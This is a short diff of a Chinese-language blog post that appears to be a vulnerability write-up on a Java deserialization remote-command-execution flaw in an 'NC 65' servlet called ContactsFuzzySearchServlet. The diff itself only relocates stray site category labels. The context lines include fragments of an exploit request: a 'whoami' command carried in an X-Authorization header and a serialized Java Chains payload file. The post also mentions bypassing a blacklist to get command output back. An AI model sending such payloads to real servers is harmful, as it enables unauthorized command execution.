@@ -22,14 +22,6 @@ NC 65
 
 直接看下`ContactsFuzzySearchServlet`的实现
 
-深入探索
-
-防病毒程序与恶意软件
-
-黑客
-
-Blog
-
 ```
 public class ContactsFuzzySearchServlet extends HttpServlet {
     private static final long serialVersionUID = -3711153542187076118L;
@@ -57,6 +49,14 @@ X-Authorization: whoami
 
 {{file(/tmp/javachains.ser)}}
 ```
+
+深入探索
+
+脚本语言
+
+商务软件和生产力软件
+
+互联网与电信
 
 使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行[命令执行](https://mrxn.net/tag/rce)回显payload
 
